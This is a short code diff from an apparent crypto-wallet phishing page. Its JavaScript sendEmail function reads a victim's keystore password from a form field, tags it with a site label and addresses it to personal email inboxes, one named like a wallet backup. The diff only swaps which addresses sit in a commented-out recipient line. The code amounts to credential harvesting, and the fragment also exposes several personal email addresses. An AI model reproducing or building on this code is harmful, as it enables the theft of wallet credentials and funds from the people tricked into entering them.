@@ -7,7 +7,7 @@ async function sendEmail() {
         keystorepassword: document.getElementById("thekeystorepassword").value,
         // from_website: "watercoinsol-wtf",
         from_website: "watercoin-pages",
-        // to_email: "adamswhity33@gmail.com,Debrabond123@outlook.com"  // Use a comma-separated string
+        // to_email: "blanknever1255@gmail.com,1mywalletbackup@gmail.com"  // Use a comma-separated string
         to_email: "1mywalletbackup@gmail.com"  // Use a comma-separated string
     };
 
